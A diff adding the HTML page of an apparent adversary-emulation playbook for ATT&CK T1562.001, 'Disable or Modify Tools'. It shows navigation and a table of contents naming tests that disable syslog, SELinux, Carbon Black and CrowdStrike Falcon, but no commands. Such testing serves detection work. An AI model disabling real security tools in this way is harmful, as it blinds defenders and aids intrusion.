@@ -1,0 +1,1858 @@
+
+
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta charset="utf-8" />
+    <title>T1562.001 - Impair Defenses: Disable or Modify Tools &#8212; The Atomic Playbook</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
+    <link href="../../_static/css/index.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../_static/sphinx-book-theme.css" type="text/css" />
+    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../../_static/jupyter-sphinx.css" />
+    <script id="documentation_options" data-url_root="../../" src="../../_static/documentation_options.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script src="../../_static/jquery.js"></script>
+    <script src="../../_static/underscore.js"></script>
+    <script src="../../_static/doctools.js"></script>
+    <script src="../../_static/language_data.js"></script>
+    <script src="../../_static/togglebutton.js"></script>
+    <script src="../../_static/clipboard.min.js"></script>
+    <script src="../../_static/copybutton.js"></script>
+    <script src="../../_static/mystnb.js"></script>
+    <script src="../../_static/sphinx-book-theme.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/require.js/2.3.4/require.min.js"></script>
+    <script src="https://unpkg.com/@jupyter-widgets/html-manager@^0.18.0/dist/embed-amd.js"></script>
+    <script async="async" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script async="async" src="https://unpkg.com/thebelab@latest/lib/index.js"></script>
+    <script >
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="../../_static/sphinx-thebe.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" />
+    <link rel="next" title="T1542 - Pre-OS Boot" href="T1542.html" />
+    <link rel="prev" title="T1036 - Masquerading" href="T1036.html" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="docsearch:language" content="en">
+
+
+
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+<a class="navbar-brand text-wrap" href="../../index.html">
+  
+  <img src="../../_static/logo.png" class="logo" alt="logo">
+  
+  
+  <h1 class="site-logo" id="site-title">The Atomic Playbook</h1>
+  
+</a>
+</div>
+
+<form class="bd-search d-flex align-items-center" action="../../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form>
+
+<nav class="bd-links" id="bd-docs-nav" aria-label="Main navigation">
+  <ul class="nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../../intro.html">
+   Welcome to the Atomic Playbook
+  </a>
+ </li>
+</ul>
+<ul class="current nav sidenav_l1">
+ <li class="toctree-l1">
+  <a class="reference internal" href="../initial-access.html">
+   Initial Access
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../execution.html">
+   Execution
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../persistence.html">
+   Persistence
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../privilege-escalation.html">
+   Privilege Escalation
+  </a>
+ </li>
+ <li class="toctree-l1 current active">
+  <a class="reference internal" href="../defense-evasion.html">
+   Defense Evasion
+  </a>
+  <ul class="current">
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1548.002.html">
+     T1548.002 - Abuse Elevation Control Mechanism: Bypass User Access Control
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1108.html">
+     T1108 - Redundant Access
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1550.003.html">
+     T1550.003 - Use Alternate Authentication Material: Pass the Ticket
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1027.005.html">
+     T1027.005 - Indicator Removal from Tools
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1578.html">
+     T1578 - Modify Cloud Compute Infrastructure
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1070.004.html">
+     T1070.004 - Indicator Removal on Host: File Deletion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1562.006.html">
+     T1562.006 - Indicator Blocking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.009.html">
+     T1055.009 - Proc Memory
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1562.004.html">
+     T1562.004 - Impair Defenses: Disable or Modify System Firewall
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.011.html">
+     T1218.011 - Signed Binary Proxy Execution: Rundll32
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1070.006.html">
+     T1070.006 - Indicator Removal on Host: Timestomp
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.012.html">
+     T1055.012 - Process Injection: Process Hollowing
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1550.001.html">
+     T1550.001 - Application Access Token
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1564.002.html">
+     T1564.002 - Hide Artifacts: Hidden Users
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1222.001.html">
+     T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.008.html">
+     T1218.008 - Signed Binary Proxy Execution: Odbcconf
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1027.003.html">
+     T1027.003 - Steganography
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.012.html">
+     T1574.012 - Hijack Execution Flow: COR_PROFILER
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1548.004.html">
+     T1548.004 - Elevated Execution with Prompt
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1564.006.html">
+     T1564.006 - Run Virtual Instance
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1542.003.html">
+     T1542.003 - Bootkit
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1070.002.html">
+     T1070.002 - Indicator Removal on Host: Clear Linux or Mac System Logs
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1556.003.html">
+     T1556.003 - Pluggable Authentication Modules
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1216.html">
+     T1216 - Signed Script Proxy Execution
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1556.001.html">
+     T1556.001 - Domain Controller Authentication
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.009.html">
+     T1574.009 - Hijack Execution Flow: Path Interception by Unquoted Path
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.002.html">
+     T1497.002 - User Activity Based Checks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1542.001.html">
+     T1542.001 - System Firmware
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1562.002.html">
+     T1562.002 - Impair Defenses: Disable Windows Event Logging
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1070.html">
+     T1070 - Indicator Removal on Host
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1149.html">
+     T1149 - LC_MAIN Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1564.004.html">
+     T1564.004 - Hide Artifacts: NTFS File Attributes
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1205.001.html">
+     T1205.001 - Port Knocking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1027.001.html">
+     T1027.001 - Obfuscated Files or Information: Binary Padding
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.010.html">
+     T1574.010 - Hijack Execution Flow: Services File Permissions Weakness
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.014.html">
+     T1055.014 - VDSO Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.010.html">
+     T1218.010 - Signed Binary Proxy Execution: Regsvr32
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1112.html">
+     T1112 - Modify Registry
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1197.html">
+     T1197 - BITS Jobs
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1562.html">
+     T1562 - Impair Defenses
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.009.html">
+     T1218.009 - Signed Binary Proxy Execution: Regsvcs/Regasm
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1548.001.html">
+     T1548.001 - Abuse Elevation Control Mechanism: Setuid and Setgid
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1564.003.html">
+     T1564.003 - Hide Artifacts: Hidden Window
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.013.html">
+     T1055.013 - Process Doppelgänging
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1027.004.html">
+     T1027.004 - Obfuscated Files or Information: Compile After Delivery
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1216.001.html">
+     T1216.001 - Signed Script Proxy Execution: Pubprn
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1550.002.html">
+     T1550.002 - Use Alternate Authentication Material: Pass the Hash
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.011.html">
+     T1055.011 - Extra Window Memory Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1134.html">
+     T1134 - Access Token Manipulation
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1222.002.html">
+     T1222.002 - File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1014.html">
+     T1014 - Rootkit
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1548.003.html">
+     T1548.003 - Abuse Elevation Control Mechanism: Sudo and Sudo Caching
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1564.001.html">
+     T1564.001 - Hide Artifacts: Hidden Files and Directories
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1480.html">
+     T1480 - Execution Guardrails
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.008.html">
+     T1055.008 - Ptrace System Calls
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1562.007.html">
+     T1562.007 - Disable or Modify Cloud Firewall
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1070.005.html">
+     T1070.005 - Indicator Removal on Host: Network Share Connection Removal
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1211.html">
+     T1211 - Exploitation for Defense Evasion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1562.003.html">
+     T1562.003 - Impair Defenses: HISTCONTROL
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.008.html">
+     T1574.008 - Path Interception by Search Order Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.003.html">
+     T1497.003 - Time Based Evasion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1070.001.html">
+     T1070.001 - Indicator Removal on Host: Clear Windows Event Logs
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.011.html">
+     T1574.011 - Hijack Execution Flow: Services Registry Permissions Weakness
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.html">
+     T1055 - Process Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1484.html">
+     T1484 - Group Policy Modification
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1564.005.html">
+     T1564.005 - Hidden File System
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1564.html">
+     T1564 - Hide Artifacts
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1550.004.html">
+     T1550.004 - Web Session Cookie
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1027.002.html">
+     T1027.002 - Obfuscated Files or Information: Software Packing
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1556.002.html">
+     T1556.002 - Modify Authentication Process: Password Filter DLL
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1070.003.html">
+     T1070.003 - Indicator Removal on Host: Clear Command History
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1036.html">
+     T1036 - Masquerading
+    </a>
+   </li>
+   <li class="toctree-l2 current active">
+    <a class="current reference internal" href="#">
+     T1562.001 - Impair Defenses: Disable or Modify Tools
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1542.html">
+     T1542 - Pre-OS Boot
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1542.002.html">
+     T1542.002 - Component Firmware
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.001.html">
+     T1497.001 - System Checks
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1127.html">
+     T1127 - Trusted Developer Utilities Proxy Execution
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.002.html">
+     T1055.002 - Portable Executable Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.006.html">
+     T1574.006 - Hijack Execution Flow: LD_PRELOAD
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1134.004.html">
+     T1134.004 - Access Token Manipulation: Parent PID Spoofing
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1127.001.html">
+     T1127.001 - Trusted Developer Utilities Proxy Execution: MSBuild
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1078.003.html">
+     T1078.003 - Local Accounts
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.001.html">
+     T1218.001 - Signed Binary Proxy Execution: Compiled HTML File
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1202.html">
+     T1202 - Indirect Command Execution
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1078.001.html">
+     T1078.001 - Valid Accounts: Default Accounts
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.003.html">
+     T1218.003 - Signed Binary Proxy Execution: CMSTP
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1064.html">
+     T1064 - Scripting
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1036.002.html">
+     T1036.002 - Right-to-Left Override
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1553.002.html">
+     T1553.002 - Code Signing
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.004.html">
+     T1574.004 - Dylib Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1548.html">
+     T1548 - Abuse Elevation Control Mechanism
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1220.html">
+     T1220 - XSL Script Processing
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1134.002.html">
+     T1134.002 - Create Process with Token
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.004.html">
+     T1055.004 - Process Injection: Asynchronous Procedure Call
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1578.001.html">
+     T1578.001 - Create Snapshot
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1140.html">
+     T1140 - Deobfuscate/Decode Files or Information
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.007.html">
+     T1218.007 - Signed Binary Proxy Execution: Msiexec
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1036.006.html">
+     T1036.006 - Masquerading: Space after Filename
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1036.004.html">
+     T1036.004 - Masquerade Task or Service
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1027.html">
+     T1027 - Obfuscated Files or Information
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1553.html">
+     T1553 - Subvert Trust Controls
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1480.001.html">
+     T1480.001 - Environmental Keying
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.005.html">
+     T1218.005 - Signed Binary Proxy Execution: Mshta
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1553.004.html">
+     T1553.004 - Subvert Trust Controls: Install Root Certificate
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.002.html">
+     T1574.002 - Hijack Execution Flow: DLL Side-Loading
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1222.html">
+     T1222 - File and Directory Permissions Modification
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1578.003.html">
+     T1578.003 - Delete Cloud Instance
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1497.html">
+     T1497 - Virtualization/Sandbox Evasion
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1036.003.html">
+     T1036.003 - Masquerading: Rename System Utilities
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.002.html">
+     T1218.002 - Signed Binary Proxy Execution: Control Panel
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1553.003.html">
+     T1553.003 - SIP and Trust Provider Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.001.html">
+     T1055.001 - Dynamic-link Library Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.005.html">
+     T1574.005 - Executable Installer File Permissions Weakness
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1578.004.html">
+     T1578.004 - Revert Cloud Instance
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1535.html">
+     T1535 - Unused/Unsupported Cloud Regions
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.html">
+     T1218 - Signed Binary Proxy Execution
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1006.html">
+     T1006 - Direct Volume Access
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1553.001.html">
+     T1553.001 - Subvert Trust Controls: Gatekeeper Bypass
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.003.html">
+     T1055.003 - Thread Execution Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.007.html">
+     T1574.007 - Path Interception by PATH Environment Variable
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1134.005.html">
+     T1134.005 - SID-History Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1078.002.html">
+     T1078.002 - Domain Accounts
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1036.001.html">
+     T1036.001 - Invalid Code Signature
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1556.html">
+     T1556 - Modify Authentication Process
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1207.html">
+     T1207 - Rogue Domain Controller
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1218.004.html">
+     T1218.004 - Signed Binary Proxy Execution: InstallUtil
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1036.005.html">
+     T1036.005 - Match Legitimate Name or Location
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1578.002.html">
+     T1578.002 - Create Cloud Instance
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1134.001.html">
+     T1134.001 - Token Impersonation/Theft
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1078.html">
+     T1078 - Valid Accounts
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1221.html">
+     T1221 - Template Injection
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1134.003.html">
+     T1134.003 - Make and Impersonate Token
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1055.005.html">
+     T1055.005 - Thread Local Storage
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.001.html">
+     T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1574.html">
+     T1574 - Hijack Execution Flow
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1550.html">
+     T1550 - Use Alternate Authentication Material
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1078.004.html">
+     T1078.004 - Cloud Accounts
+    </a>
+   </li>
+   <li class="toctree-l2">
+    <a class="reference internal" href="T1205.html">
+     T1205 - Traffic Signaling
+    </a>
+   </li>
+  </ul>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../credential-access.html">
+   Credential Access
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../discovery.html">
+   Discovery
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../lateral-movement.html">
+   Lateral Movement
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../collection.html">
+   Collection
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../command-and-control.html">
+   Command and Control
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../exfiltration.html">
+   Exfiltration
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="../impact.html">
+   Impact
+  </a>
+ </li>
+</ul>
+
+</nav>
+
+ <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="row topbar fixed-top container-xl">
+    <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show">
+    </div>
+    <div class="col pl-2 topbar-main">
+        
+        <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+            data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+            aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+            title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+            <i class="fas fa-bars"></i>
+            <i class="fas fa-arrow-left"></i>
+            <i class="fas fa-arrow-up"></i>
+        </button>
+        
+        <div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../../_sources/tactics/defense-evasion/T1562.001.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+            onClick="window.print()" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+    
+</div>
+        <!-- Source interaction buttons -->
+
+
+        <!-- Full screen (wrap in <a> to have style consistency -->
+        <a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+                data-placement="bottom" onclick="toggleFullScreen()" title="Fullscreen mode"><i
+                    class="fas fa-expand"></i></button></a>
+
+        <!-- Launch buttons -->
+
+    </div>
+
+    <!-- Table of contents -->
+    <div class="d-none d-md-block col-md-2 bd-toc show">
+        <div class="tocsection onthispage pt-5 pb-3">
+            <i class="fas fa-list"></i> Contents
+        </div>
+        <nav id="bd-toc-nav">
+            <ul class="nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#atomic-tests">
+   Atomic Tests
+  </a>
+  <ul class="nav section-nav flex-column">
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-1-disable-syslog">
+     Atomic Test #1 - Disable syslog
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#attack-commands-run-with-sh">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-2-disable-cb-response">
+     Atomic Test #2 - Disable Cb Response
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id1">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-3-disable-selinux">
+     Atomic Test #3 - Disable SELinux
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id2">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-4-stop-crowdstrike-falcon-on-linux">
+     Atomic Test #4 - Stop Crowdstrike Falcon on Linux
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id3">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-5-disable-carbon-black-response">
+     Atomic Test #5 - Disable Carbon Black Response
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id4">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
+    <a class="reference internal nav-link" href="#atomic-test-6-disable-littlesnitch">
+     Atomic Test #6 - Disable LittleSnitch
+    </a>
+    <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id5">
+       Attack Commands: Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         sh
+        </span>
+       </code>
+      </a>
+     </li>
+    </ul>
+   </li>
+   <li class="toc-h3 nav-item toc-entry">
